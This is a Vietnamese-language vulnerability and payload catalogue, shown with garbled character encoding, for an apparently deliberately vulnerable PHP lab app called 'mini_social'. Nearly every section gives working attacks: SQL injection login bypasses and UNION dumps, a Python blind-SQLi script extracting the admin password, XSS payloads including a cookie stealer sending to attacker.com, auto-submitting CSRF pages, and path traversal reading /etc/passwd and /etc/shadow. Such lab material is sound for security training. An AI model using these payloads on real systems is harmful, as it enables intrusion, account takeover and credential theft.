# Tá»”NG Há»¢P Lá»– Há»”NG VÃ€ PAYLOAD BYPASS - MINI SOCIAL

## ğŸ“‹ Má»¤C Lá»¤C
1. [index.php - Trang Ä‘Äƒng nháº­p](#1-indexphp---trang-Ä‘Äƒng-nháº­p)
2. [register.php - Trang Ä‘Äƒng kÃ½](#2-registerphp---trang-Ä‘Äƒng-kÃ½)
3. [verify_2fa.php - XÃ¡c thá»±c 2FA](#3-verify_2faphp---xÃ¡c-thá»±c-2fa)
4. [forgot_password.php - QuÃªn máº­t kháº©u](#4-forgot_passwordphp---quÃªn-máº­t-kháº©u)
5. [home.php - Trang chá»§](#5-homephp---trang-chá»§)
6. [profile.php - Trang profile](#6-profilephp---trang-profile)
7. [change_username.php - Äá»•i username POST](#7-change_usernamephp---Ä‘á»•i-username-post)
8. [change_username2.php - Äá»•i username GET](#8-change_username2php---Ä‘á»•i-username-get)
9. [user_manage.php - Quáº£n lÃ½ user](#9-user_managephp---quáº£n-lÃ½-user)
10. [edit_post.php - Sá»­a bÃ i viáº¿t](#10-edit_postphp---sá»­a-bÃ i-viáº¿t)
11. [delete_post.php - XÃ³a bÃ i viáº¿t](#11-delete_postphp---xÃ³a-bÃ i-viáº¿t)
12. [loadImage.php - Load áº£nh](#12-loadimagephp---load-áº£nh)

---

## 1. index.php - Trang Ä‘Äƒng nháº­p

### ğŸ”´ Lá»– Há»”NG 1.1: SQL Injection - Authentication Bypass
**MÃ´ táº£:** Username vÃ  password Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o cÃ¢u SQL (line 38)  
**Code vulnerable:**
```php
$sql = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Bypass vá»›i comment**
```
Username: admin' -- 
Password: anything
```
**Giáº£i thÃ­ch:** Comment pháº§n kiá»ƒm tra password

#### âœ… **Payload 2: OR 1=1**
```
Username: ' OR 1=1 -- 
Password: anything
```
**Giáº£i thÃ­ch:** LuÃ´n tráº£ vá» true

#### âœ… **Payload 3: UNION-based**
```
Username: ' UNION SELECT 'admin', 'admin123', 'admin', 1 -- 
Password: anything
```

#### âœ… **Payload 4: Bypass cáº£ username vÃ  password**
```
Username: admin
Password: ' OR '1'='1
```

#### âœ… **Payload 5: Bypass vá»›i NULL**
```
Username: admin' OR username IS NOT NULL -- 
Password: anything
```

**CÃ¡ch test:**
```bash
# Sá»­ dá»¥ng Burp Suite hoáº·c curl
curl -X POST http://localhost/mini_social/index.php \
  -d "username=admin' -- &password=test"
```

---

### ğŸ”´ Lá»– Há»”NG 1.2: Rate Limiting Bypass
**MÃ´ táº£:** Tin tÆ°á»Ÿng header X-Forwarded-For Ä‘á»ƒ rate limit theo IP (line 14-16)  
**Code vulnerable:**
```php
$clientIp = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $clientIp = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
}
```

**PAYLOAD BYPASS:**

#### âœ… **Bypass rate limit báº±ng cÃ¡ch thay Ä‘á»•i IP**
```http
POST /mini_social/index.php HTTP/1.1
Host: localhost
X-Forwarded-For: 1.2.3.4
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong_pass
```



### ğŸ”´ Lá»– Há»”NG 1.3: Username Enumeration - Timing Attack
**MÃ´ táº£:** Delay khÃ¡c nhau khi username tá»“n táº¡i (line 42-46)  
**Code vulnerable:**
```php
$sqlUser = "SELECT id, username, role, password FROM users WHERE username = '" . $username . "'";
$resultUser = $config->query($sqlUser);
if ($resultUser && $resultUser->num_rows > 0) {
    $delay = min(strlen($password) * 10000, 800000);
    usleep($delay);
}
```

**PAYLOAD BYPASS:**
tÄƒng Ä‘á»™ dÃ i pass Ä‘á»ƒ tÄƒng thá»i gian delay -> nháº­n biáº¿t qua request completed

---

### ğŸ”´ Lá»– Há»”NG 1.4: Username Enumeration - Error Message Difference
**MÃ´ táº£:** ThÃ´ng bÃ¡o lá»—i khÃ¡c nhau giá»¯a username tá»“n táº¡i vÃ  khÃ´ng tá»“n táº¡i (line 78-82)  
**Code vulnerable:**
```php
if ($resultUser && $resultUser->num_rows > 0) {
    $error = "Invalid username or password."; // cÃ³ dáº¥u cháº¥m
} else {
    $error = "Invalid username or password "; // cÃ³ khoáº£ng tráº¯ng
}
```

**PAYLOAD BYPASS:**


### ğŸ”´ Lá»– Há»”NG 1.5: Session Security - Missing Flags
**MÃ´ táº£:** Cookie security flags bá»‹ comment (line 3-5)
**Code vulnerable:**
```php
// ini_set('session.cookie_samesite', 'lax');
// ini_set('session.cookie_secure', '1');
// ini_set('session.cookie_httponly', '1');
```

**EXPLOIT:**
- Cookie cÃ³ thá»ƒ bá»‹ Ä‘Ã¡nh cáº¯p qua XSS (khÃ´ng cÃ³ httponly)
- Cookie cÃ³ thá»ƒ bá»‹ sniff qua HTTP (khÃ´ng cÃ³ secure)
- Cookie dá»… bá»‹ CSRF (khÃ´ng cÃ³ samesite)

---

### ğŸ”´ Lá»– Há»”NG 1.6: 2FA Bypass - Session Set Before Verification
**MÃ´ táº£:** Session Ä‘Æ°á»£c set trÆ°á»›c khi verify 2FA (line 51-53)
**Code vulnerable:**
```php
$_SESSION['username'] = $row['username'];
$_SESSION['role'] = $row['role'];
$_SESSION['2fa_verified'] = false;
```

**PAYLOAD BYPASS:**

#### âœ… **Bypass báº±ng cÃ¡ch truy cáº­p trá»±c tiáº¿p sau login**
```bash
# ÄÄƒng nháº­p vá»›i SQLi
# Session Ä‘Ã£ Ä‘Æ°á»£c set nhÆ°ng 2fa_verified = false
# Má»™t sá»‘ page cÃ³ thá»ƒ khÃ´ng check 2fa_verified
```

---

## 2. register.php - Trang Ä‘Äƒng kÃ½

### ğŸ”´ Lá»– Há»”NG 2.1: Plaintext Password Storage
**MÃ´ táº£:** Password lÆ°u dáº¡ng plaintext (line 33)  
**Code vulnerable:**
```php
$stmt = $config -> prepare("INSERT INTO users ( username, email, password, role) VALUES (?,?,?,?)");
$stmt -> bind_param("ssss",$username, $email, $password, $role);
```

**IMPACT:**
- Náº¿u database bá»‹ leak, táº¥t cáº£ password lá»™
- Admin cÃ³ thá»ƒ Ä‘á»c password cá»§a táº¥t cáº£ user

---

### ğŸ”´ Lá»– Há»”NG 2.3: Stored XSS - Username
**MÃ´ táº£:** Username khÃ´ng Ä‘Æ°á»£c sanitize khi lÆ°u vÃ o DB  

**PAYLOAD BYPASS:**

#### âœ… **Register vá»›i username chá»©a XSS**
```html
<img src=x onerror=alert(1)>
```

#### âœ… **Username vá»›i SVG**
```html
<svg onload=alert(document.cookie)>
```

**CÃ¡ch test:**
```bash
# Register vá»›i username XSS
Username: <img src=x onerror=alert(1)>
Password: test123
Confirm: test123

# Sau khi Ä‘Äƒng kÃ½ thÃ nh cÃ´ng vÃ  login
# Username sáº½ Ä‘Æ°á»£c hiá»ƒn thá»‹ trÃªn home.php mÃ  khÃ´ng sanitize
```

---

## 3. verify_2fa.php - XÃ¡c thá»±c 2FA

### ğŸ”´ Lá»– Há»”NG 3.1: OTP Bruteforce - No Rate Limit
**MÃ´ táº£:** KhÃ´ng cÃ³ rate limit cho viá»‡c nháº­p OTP  


---

### ğŸ”´ Lá»– Há»”NG 3.2: OTP Storage - Plaintext in Database
**MÃ´ táº£:** OTP Ä‘Æ°á»£c lÆ°u plaintext trong báº£ng emails

**IMPACT:**
- Ai cÃ³ quyá»n truy cáº­p database Ä‘á»u xem Ä‘Æ°á»£c OTP
- OTP khÃ´ng expire

---

## 4. forgot_password.php - QuÃªn máº­t kháº©u

### ğŸ”´ Lá»– Há»”NG 4.1: Insecure Password Reset - Token Not Validated
**MÃ´ táº£:** Token trÃªn URL khÃ´ng Ä‘Æ°á»£c kiá»ƒm tra khi reset password (line 64)  
**Code vulnerable:**
```php
// BÆ°á»›c 3: Nháº­n máº­t kháº©u má»›i qua POST (vá»›i token trÃªn URL nhÆ°ng KHÃ”NG kiá»ƒm tra)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'reset') {
    // Lá»– Há»”NG: KhÃ´ng kiá»ƒm tra temp-forgot-password-token á»Ÿ URL
    // Lá»– Há»”NG: Tin tÆ°á»Ÿng hidden input username
    $newPassword = isset($_POST['new_password']) ? $_POST['new_password'] : '';
    $targetUser  = isset($_POST['username']) ? $_POST['username'] : '';
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Äá»•i password user khÃ¡c**
```html
<!-- Sau khi nháº­n Ä‘Æ°á»£c link reset tá»« email -->
<!-- URL: forgot_password.php?temp-forgot-password-token=abc123 -->

<!-- Sá»­a hidden field username tá»« "user1" thÃ nh "admin" -->
<form method="post" action="forgot_password.php?temp-forgot-password-token=abc123">
    <input type="hidden" name="action" value="reset">
    <input type="hidden" name="username" value="admin">  <!-- Sá»­a thÃ nh admin -->
    <input type="password" name="new_password" value="hacked123">
    <button type="submit">Äá»•i máº­t kháº©u</button>
</form>
```

#### âœ… **Payload 2: Sá»­ dá»¥ng Burp Suite**
```http
POST /mini_social/forgot_password.php?temp-forgot-password-token=any_random_string HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

action=reset&username=admin&new_password=hacked123
```

**CÃ¡ch exploit:**
1. YÃªu cáº§u reset password cho tÃ i khoáº£n cá»§a mÃ¬nh (user1)
2. Nháº­n link reset cÃ³ token
3. Má»Ÿ link, DevTools > Inspect form
4. Sá»­a hidden field `username` tá»« `user1` thÃ nh `admin`
5. Nháº­p password má»›i vÃ  submit
6. Password cá»§a admin bá»‹ thay Ä‘á»•i!

---

### ğŸ”´ Lá»– Há»”NG 4.2: SQLi trong Username Check
**MÃ´ táº£:** Username khÃ´ng Ä‘Æ°á»£c validate (line 25)  
**Code vulnerable:**
```php
$username = isset($_POST['username']) ? $_POST['username'] : '';
```

**PAYLOAD BYPASS:**

#### âœ… **Enum users vá»›i SQLi timing**
```
Username: admin' AND SLEEP(5) -- 
```

---

## 5. home.php - Trang chá»§

### ğŸ”´ Lá»– Há»”NG 5.1: Boolean-based SQLi via Cookie
**MÃ´ táº£:** TrackingId cookie Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o SQL (line 17, 32)  
**Code vulnerable:**
```php
$check_sql = "SELECT * FROM tracking WHERE TrackingId = '" . $tracking_id . "'";
$sql = "SELECT * FROM tracking WHERE TrackingId = '" . $tracking_id . "'";
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Boolean test**
```
Cookie: TrackingId=xyz' OR 1=1 -- 
```
**Káº¿t quáº£:** "Welcome back!" (true condition)

```
Cookie: TrackingId=xyz' AND 1=2 -- 
```
**Káº¿t quáº£:** "Welcome!" (false condition)

#### âœ… **Payload 2: Extract data**
```
Cookie: TrackingId=xyz' OR (SELECT LENGTH(password) FROM users WHERE username='admin')=10 -- 
```

#### âœ… **Payload 3: Extract password char by char**
```python
import requests

def extract_password():
    password = ""
    for pos in range(1, 50):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            cookie = f"xyz' OR (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='admin')='{char}' -- "
            cookies = {'TrackingId': cookie}
            r = requests.get('http://localhost/mini_social/home.php', cookies=cookies)
            if "Welcome back!" in r.text:
                password += char
                print(f"[+] Found char: {char}, password so far: {password}")
                break
        else:
            break  # No more chars
    return password

password = extract_password()
print(f"[+] Admin password: {password}")
```

#### âœ… **Payload 4: UNION-based**
```
Cookie: TrackingId=xyz' UNION SELECT username,password,NULL FROM users -- 
```

---

### ğŸ”´ Lá»– Há»”NG 5.2: UNION-based SQLi via mode parameter
**MÃ´ táº£:** Parameter mode Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o ORDER BY clause (line 75)  
**Code vulnerable:**
```php
$mode = isset($_GET['mode']) ? $_GET['mode'] : '';
$orderClause = 'ORDER BY posts.created_at DESC';
if ($mode !== '') {
    $orderClause = $mode;
}
$sql = "SELECT posts.id, posts.user_id, ... FROM posts JOIN users ... " . $orderClause;
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: TÃ¬m sá»‘ cá»™t**
```
?mode=ORDER BY 1-- -
?mode=ORDER BY 2-- -
?mode=ORDER BY 3-- -
?mode=ORDER BY 4-- -
?mode=ORDER BY 5-- -
?mode=ORDER BY 6-- -   (Invalid = cÃ³ 5 cá»™t)
```

#### âœ… **Payload 2: UNION SELECT**
```
?mode=UNION SELECT 1,2,3,4,5-- -
```

#### âœ… **Payload 3: Extract usernames**
```
?mode=UNION SELECT id,user_id,username,password,role FROM users-- -
```

#### âœ… **Payload 4: Test kiá»ƒu dá»¯ liá»‡u cá»™t**
```
# Test cá»™t 1 (id) lÃ  int
?mode=UNION SELECT 'abc',2,3,4,5-- -
# Náº¿u bÃ¡o "CÃ³ thá»ƒ sai kiá»ƒu dá»¯ liá»‡u cá»™t id" => cá»™t 1 lÃ  int

# Test cá»™t 3 (content) lÃ  string
?mode=UNION SELECT 1,2,'test',4,5-- -
# Náº¿u khÃ´ng lá»—i => cá»™t 3 lÃ  string
```

#### âœ… **Payload 5: Dump all users**
```
?mode=UNION SELECT NULL,NULL,CONCAT(username,':',password),NULL,NULL FROM users-- -
```

#### âœ… **Payload 6: Read files (if FILE privilege)**
```
?mode=UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4,5-- -
?mode=UNION SELECT 1,2,LOAD_FILE('C:/xampp/htdocs/mini_social/config.php'),4,5-- -
```

---

### ğŸ”´ Lá»– Há»”NG 5.3: Stored XSS - Post Content
**MÃ´ táº£:** Post content Ä‘Æ°á»£c lÆ°u vÃ  hiá»ƒn thá»‹ khÃ´ng sanitize  

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Basic script**
```html
<script>alert('XSS')</script>
```

#### âœ… **Payload 2: Image onerror**
```html
<img src=x onerror="alert(document.cookie)">
```

#### âœ… **Payload 3: Cookie stealer**
```html
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

#### âœ… **Payload 4: SVG onload**
```html
<svg onload="alert(document.domain)"></svg>
```

#### âœ… **Payload 5: iframe srcdoc**
```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

#### âœ… **Payload 6: Details ontoggle**
```html
<details open ontoggle="alert(document.cookie)"><summary>Click</summary></details>
```

---

### ğŸ”´ Lá»– Há»”NG 5.4: Reflected XSS - Search Parameter
**MÃ´ táº£:** Parameter q Ä‘Æ°á»£c reflected khÃ´ng sanitize  

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Basic**
```
?q=<script>alert('XSS')</script>
```

#### âœ… **Payload 2: Break out of value**
```
?q="><script>alert(document.cookie)</script>
```

#### âœ… **Payload 3: Event handler**
```
?q=" onfocus="alert(1)" autofocus="
```

#### âœ… **Payload 4: SVG**
```
?q=<svg/onload=alert(document.domain)>
```

---

## 6. profile.php - Trang profile

### ğŸ”´ Lá»– Há»”NG 6.1: IDOR - View Any User Profile
**MÃ´ táº£:** CÃ³ thá»ƒ xem profile cá»§a báº¥t ká»³ user nÃ o (line 13)  
**Code vulnerable:**
```php
$view_id = isset($_GET['id']) ? intval($_GET['id']) : 0;
if ($view_id) {
    $stmt = $config->prepare("SELECT id, username, email, role FROM users WHERE id = ?");
    $stmt->bind_param("i", $view_id);
```

**PAYLOAD BYPASS:**

#### âœ… **Xem profile admin**
```
/profile.php?id=1
```

#### âœ… **Enumerate all users**
```python
import requests

session = requests.Session()
# Login first
session.post('http://localhost/mini_social/index.php', 
             data={'username': 'user1', 'password': 'pass123'})

for user_id in range(1, 100):
    r = session.get(f'http://localhost/mini_social/profile.php?id={user_id}')
    if 'User ID:' in r.text:
        # Extract username, email, role from response
        print(f"[+] Found user ID {user_id}")
```

---

### ğŸ”´ Lá»– Há»”NG 6.2: Path Traversal - Avatar Parameter
**MÃ´ táº£:** Parameter avatar Ä‘Æ°á»£c truyá»n vÃ o loadImage.php (line 29)  
**Code vulnerable:**
```php
$avatar = isset($_GET['avatar']) ? $_GET['avatar'] : 'avatar.png';
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Read config.php**
```
/profile.php?avatar=../config.php
```

#### âœ… **Payload 2: Read index.php**
```
/profile.php?avatar=../index.php
```

#### âœ… **Payload 3: Read system files (Windows)**
```
/profile.php?avatar=../../../../../../xampp/phpMyAdmin/config.inc.php
```

#### âœ… **Payload 4: Read /etc/passwd (Linux)**
```
/profile.php?avatar=../../../../../../etc/passwd
```

---

## 7. change_username.php - Äá»•i username POST

### ğŸ”´ Lá»– Há»”NG 7.1: CSRF Token Bypass
**MÃ´ táº£:** Chá»‰ check CSRF khi cÃ³ parameter csrf (line 20)  
**Code vulnerable:**
```php
if ($csrf !== '' && (!isset($_SESSION['csrf']) || !hash_equals($_SESSION['csrf'], $csrf))) {
    $_SESSION['error'] = 'CSRF token khÃ´ng há»£p lá»‡';
```

**PAYLOAD BYPASS:**

#### âœ… **Bypass báº±ng cÃ¡ch bá» qua parameter csrf**
```html
<!-- File: csrf_attack.html -->
<html>
<body>
<form action="http://localhost/mini_social/change_username.php" method="POST" id="csrf_form">
    <input type="hidden" name="new_username" value="HACKED">
    <!-- KhÃ´ng cÃ³ field csrf -->
</form>
<script>
    document.getElementById('csrf_form').submit();
</script>
</body>
</html>
```

**CÃ¡ch test:**
1. Victim Ä‘Äƒng nháº­p vÃ o mini_social
2. Victim má»Ÿ file csrf_attack.html
3. Form tá»± Ä‘á»™ng submit mÃ  khÃ´ng cÃ³ CSRF token
4. Username bá»‹ thay Ä‘á»•i!

---

## 8. change_username2.php - Äá»•i username GET

### ğŸ”´ Lá»– Há»”NG 8.1: GET-based CSRF
**MÃ´ táº£:** Cho phÃ©p Ä‘á»•i username qua GET request (line 11)  
**Code vulnerable:**
```php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $newUsername = isset($_GET['new_username']) ? trim($_GET['new_username']) : '';
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Direct link**
```html
<a href="http://localhost/mini_social/change_username2.php?new_username=HACKED">
    Click here for free gift!
</a>
```

#### âœ… **Payload 2: Auto-submit with image**
```html
<img src="http://localhost/mini_social/change_username2.php?new_username=HACKED" style="display:none">
```

#### âœ… **Payload 3: XSS to CSRF**
```javascript
// Trong post content (XSS)
<script>
fetch('/mini_social/change_username2.php?new_username=PWNED');
</script>
```

---

## 9. user_manage.php - Quáº£n lÃ½ user

### ğŸ”´ Lá»– Há»”NG 9.1: Authorization Bypass - Role Injection
**MÃ´ táº£:** Role Ä‘Æ°á»£c láº¥y tá»« GET parameter trÆ°á»›c session (line 8)  
**Code vulnerable:**
```php
$userRole = isset($_GET['role']) ? $_GET['role'] : (isset($_SESSION['role']) ? $_SESSION['role'] : 'user');

if (!isset($_SESSION['username']) || $userRole !== 'admin') {
    header('Location: index.php');
    exit();
}
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Truy cáº­p admin panel**
```
/user_manage.php?role=admin
```

#### âœ… **Payload 2: Bypass vá»›i Burp Suite**
```http
GET /mini_social/user_manage.php?role=admin HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123
```

**CÃ¡ch test:**
1. ÄÄƒng nháº­p vá»›i user thÆ°á»ng (user1)
2. Truy cáº­p `/user_manage.php` => Bá»‹ redirect
3. Truy cáº­p `/user_manage.php?role=admin` => ThÃ nh cÃ´ng!

---

## 10. edit_post.php - Sá»­a bÃ i viáº¿t

### ğŸ”´ Lá»– Há»”NG 10.1: Missing Authorization Check
**MÃ´ táº£:** KhÃ´ng kiá»ƒm tra ownership cá»§a post  
**Code vulnerable:**
```php
// Láº¥y thÃ´ng tin bÃ i viáº¿t
$stmt = $config->prepare("SELECT posts.*, users.username FROM posts JOIN users ON posts.user_id = users.id WHERE posts.id = ?");
$stmt->bind_param("i", $post_id);
$stmt->execute();
$result = $stmt->get_result();
$post = $result->fetch_assoc();

// KhÃ´ng cÃ³ check: if ($post['user_id'] != current_user_id) { deny }

// Update trá»±c tiáº¿p
$stmt = $config->prepare("UPDATE posts SET content = ? WHERE id = ?");
```

**PAYLOAD BYPASS:**

#### âœ… **Edit bÃ i viáº¿t cá»§a ngÆ°á»i khÃ¡c**
```http
POST /mini_social/edit_post.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=user1_session
Content-Type: application/x-www-form-urlencoded

id=1&content=HACKED BY USER1
```

**CÃ¡ch test:**
1. User1 Ä‘Äƒng nháº­p
2. TÃ¬m post_id cá»§a admin (xem source HTML hoáº·c intercept request)
3. Gá»­i request edit vá»›i post_id cá»§a admin
4. Post cá»§a admin bá»‹ sá»­a!

---

## 11. delete_post.php - XÃ³a bÃ i viáº¿t

### ğŸ”´ Lá»– Há»”NG 11.1: GET-based CSRF + Missing Authorization
**MÃ´ táº£:** XÃ³a post qua GET vÃ  khÃ´ng check ownership (line 33)  
**Code vulnerable:**
```php
if ($_SERVER['REQUEST_METHOD'] === 'GET'){
    $stmt = $config->prepare("DELETE FROM posts WHERE id = ?");
    $stmt->bind_param("i", $post_id);
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Direct link CSRF**
```html
<img src="http://localhost/mini_social/delete_post.php?id=1" style="display:none">
```

#### âœ… **Payload 2: XSS to mass delete**
```javascript
// Post content vá»›i XSS
<script>
// XÃ³a táº¥t cáº£ posts
for(let i=1; i<100; i++){
    fetch(`/mini_social/delete_post.php?id=${i}`);
}
</script>
```

#### âœ… **Payload 3: XÃ³a post cá»§a admin**
```
/delete_post.php?id=1
```

---

## 12. loadImage.php - Load áº£nh

### ğŸ”´ Lá»– Há»”NG 12.1: Path Traversal
**MÃ´ táº£:** KhÃ´ng validate Ä‘Æ°á»ng dáº«n file (line 3-5)  
**Code vulnerable:**
```php
$baseDir = __DIR__ . "/uploads/" .DIRECTORY_SEPARATOR;
$filename = $_GET['filename'] ?? '';
$path = $baseDir . $filename; // Ná»‘i trá»±c tiáº¿p, khÃ´ng chuáº©n hÃ³a
```

**PAYLOAD BYPASS:**

#### âœ… **Payload 1: Read config.php**
```
/loadImage.php?filename=../config.php
```

#### âœ… **Payload 2: Read source code**
```
/loadImage.php?filename=../index.php
/loadImage.php?filename=../home.php
/loadImage.php?filename=../register.php
```

#### âœ… **Payload 3: Read system files (Windows)**
```
/loadImage.php?filename=../../../../../../xampp/phpMyAdmin/config.inc.php
/loadImage.php?filename=../../../../../../Windows/System32/drivers/etc/hosts
```

#### âœ… **Payload 4: Read system files (Linux)**
```
/loadImage.php?filename=../../../../../../etc/passwd
/loadImage.php?filename=../../../../../../etc/shadow
```

#### âœ… **Payload 5: Double encoding**
```
/loadImage.php?filename=%2e%2e%2fconfig.php
```

#### âœ… **Payload 6: Null byte (PHP < 5.3.4)**
```
/loadImage.php?filename=../config.php%00.jpg
```

**CÃ¡ch test vá»›i curl:**
```bash
# Read config.php
curl "http://localhost/mini_social/loadImage.php?filename=../config.php"

# Read source
curl "http://localhost/mini_social/loadImage.php?filename=../index.php"
```

---

## ğŸ“Š Tá»”NG Káº¾T Lá»– Há»”NG

### Theo loáº¡i:
- **SQL Injection**: 3 lá»— há»•ng (index.php, home.php x2)
- **XSS**: 4 lá»— há»•ng (register.php, home.php x3)
- **CSRF**: 3 lá»— há»•ng (change_username.php, change_username2.php, delete_post.php)
- **Authorization Bypass**: 3 lá»— há»•ng (user_manage.php, edit_post.php, profile.php IDOR)
- **Authentication Issues**: 4 lá»— há»•ng (username enum x2, rate limit bypass, 2FA issues)
- **Password Issues**: 2 lá»— há»•ng (plaintext storage, insecure reset)
- **Path Traversal**: 1 lá»— há»•ng (loadImage.php)

### Theo má»©c Ä‘á»™ nghiÃªm trá»ng:
- **Critical**: 7 (SQLi x3, Password Reset, Auth Bypass, Path Traversal, Edit/Delete others' posts)
- **High**: 6 (XSS x4, CSRF x2)
- **Medium**: 4 (IDOR, Username Enum x2, 2FA bypass)
- **Low**: 3 (Session flags, Rate limit, OTP storage)

---

## ğŸ› ï¸ CÃ”NG Cá»¤ Há»– TRá»¢

### Burp Suite
```
# Intercept vÃ  modify requests
# Repeater Ä‘á»ƒ test payloads
# Intruder Ä‘á»ƒ bruteforce
```

### sqlmap
```bash
# Test SQLi via Cookie
sqlmap -u "http://localhost/mini_social/home.php" \
       --cookie="TrackingId=xyz*" --level=2 --risk=3

# Test SQLi via GET
sqlmap -u "http://localhost/mini_social/home.php?mode=test" \
       --level=2 --risk=3
```

### Python Script Template
```python
import requests

BASE_URL = "http://localhost/mini_social"
session = requests.Session()

def login(username, password):
    data = {"username": username, "password": password}
    r = session.post(f"{BASE_URL}/index.php", data=data)
    return "verify_2fa" in r.url

def exploit_sqli():
    # Your exploit code here
    pass

if __name__ == "__main__":
    # Test exploits
    pass
```

---

**âš ï¸ DISCLAIMER:** Táº¥t cáº£ payloads trong file nÃ y chá»‰ dÃ¹ng cho má»¥c Ä‘Ã­ch há»c táº­p vÃ  testing trong mÃ´i trÆ°á»ng lab cá»§a báº¡n. KhÃ´ng sá»­ dá»¥ng cho má»¥c Ä‘Ã­ch báº¥t há»£p phÃ¡p.
